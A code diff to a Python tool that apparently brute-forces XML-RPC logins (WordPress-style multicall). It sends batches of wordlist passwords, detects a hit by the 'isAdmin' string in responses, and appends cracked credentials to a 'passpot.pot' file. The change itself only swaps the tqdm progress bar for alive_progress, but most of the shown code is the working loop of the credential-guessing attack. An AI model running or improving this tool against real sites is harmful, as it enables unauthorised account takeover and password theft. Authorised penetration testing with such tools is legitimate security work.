@@ -13,6 +13,10 @@
 # See the License for the specific language governing permissions and
 #    limitations under the License.
 
+# [ REQUIREMENTS ]
+# colorama==0.4.3
+# alive_progress==3.0.0
+
 import argparse
 from colorama import Fore, Back, Style
 from itertools import islice
@@ -20,7 +24,7 @@ from queue import Queue
 import re
 import signal
 import sys
-from tqdm import tqdm
+from alive_progress import alive_bar
 import threading
 import time
 import xmlrpc.client
@@ -37,12 +41,13 @@ TRAFFIC_OUT = Fore.MAGENTA + "[TRAFFIC OUT] "
 WARNING = Fore.YELLOW + "[WARNING] "
 
 class Thread(threading.Thread):
-    def __init__(self, queue, xmlrpc_intf, username, verbose):
+    def __init__(self, queue, pbar, xmlrpc_intf, username, verbose):
         threading.Thread.__init__(self)
         self.queue = queue
         self.xmlrpc_intf = xmlrpc_intf
         self.username = username
         self.verbose = verbose
+        self.pbar = pbar
 
     def run(self):
         proxy = xmlrpc.client.ServerProxy(self.xmlrpc_intf)
@@ -56,8 +61,6 @@ class Thread(threading.Thread):
         calls = 0
         global exit_flag
 
-        pbar = tqdm(self.queue.qsize(), desc=self.name, total=self.queue.qsize(), unit='multicall', unit_scale=True, dynamic_ncols=True)
-
         while not self.queue.empty() and not exit_flag:
             chunks_size = self.queue.get()
             multicall = xmlrpc.client.MultiCall(proxy)
@@ -68,17 +71,17 @@ class Thread(threading.Thread):
 
             try:
                 if self.verbose:
-                    pbar.write(Fore.MAGENTA + "[{}]".format(self.name) + TRAFFIC_OUT + "XML request [#{}]:".format(calls))
-                    pbar.write("{}".format(chunks_size) + Style.RESET_ALL)
+                    print(Fore.MAGENTA + "[{}]".format(self.name) + TRAFFIC_OUT + "XML request [#{}]:".format(calls))
+                    print("{}".format(chunks_size) + Style.RESET_ALL)
                 
                 res = multicall()
             except:
-                pbar.write(ERROR + "could not make an XML-RPC call" + Style.RESET_ALL)
+                print(ERROR + "could not make an XML-RPC call" + Style.RESET_ALL)
                 continue
 
             if self.verbose:
-                pbar.write(Back.MAGENTA + "[{}]".format(self.name) + TRAFFIC_IN + "XML response [#{}] (200 OK):".format(calls))
-                pbar.write("{}".format(res.results) + Style.RESET_ALL)
+                print(Back.MAGENTA + "[{}]".format(self.name) + TRAFFIC_IN + "XML response [#{}] (200 OK):".format(calls))
+                print("{}".format(res.results) + Style.RESET_ALL)
 
             if re.search("isAdmin", str(res.results), re.MULTILINE):
                 i = 0
@@ -89,19 +92,17 @@ class Thread(threading.Thread):
                         # let time for the threads to terminate
                         time.sleep(2)
                     	# pbar.write() seems to be bugged at the moment
-                        pbar.write(RESULT + "found a match: \"{0}:{1}\"".format(self.username, chunks_size[i].strip()) + Style.RESET_ALL)
+                        print(RESULT + "found a match: \"{0}:{1}\"".format(self.username, chunks_size[i].strip()) + Style.RESET_ALL)
                         # Log the password in case sys.stdout acts dodgy
                         with open("passpot.pot", "a+") as logfile:
                         	logfile.write("{0} - {1}:{2}\n".format(self.xmlrpc_intf, self.username, chunks_size[i].strip()))
-                        break 
+                        break
 
                     i += 1
             
             calls += 1
             self.queue.task_done()
-            pbar.update()
-
-        pbar.close()
+            self.pbar()
 
 def banner():
 
@@ -203,25 +204,25 @@ def main():
     # Load and segmentate the wordlist into the queue
     queue = reader(wordlist, chunks_size, verbose)
 
-    # Run a few threads on the network requester
-    for i in range(threads_number):
-        thread = Thread(queue, xmlrpc_intf, username, verbose)
-        thread.daemon = True
-        thread.start()
-        threads.append(thread)
-        # Wait tqdm to get the previous pbar position to compute the position for the current thread pbar 
-        time.sleep(0.5)
+    with alive_bar(queue.qsize(), enrich_print=False, theme='classic') as pbar:
 
-    # Block the main thread until the daemons have processed everything that's in the queue
-    for thread in threads:
-	    thread.join()
+        # Run a few threads on the network requester
+        for i in range(threads_number):
+            thread = Thread(queue, pbar, xmlrpc_intf, username, verbose)
+            thread.daemon = True
+            thread.start()
+            threads.append(thread)
 
-    if not exit_flag:
-    	print(WARNING + "no match found" + Style.RESET_ALL)
-    else:
-        print(INFO + "password logged" + Style.RESET_ALL)
+        # Block the main thread until the daemons have processed everything that's in the queue
+        for thread in threads:
+            thread.join()
 
-    print("[*] finished at {}".format(time.ctime()))
+        if not exit_flag:
+            print(WARNING + "no match found" + Style.RESET_ALL)
+        else:
+            print(INFO + "password logged" + Style.RESET_ALL)
+
+        print("[*] finished at {}".format(time.ctime()))
 
 if __name__ == "__main__":
     main()
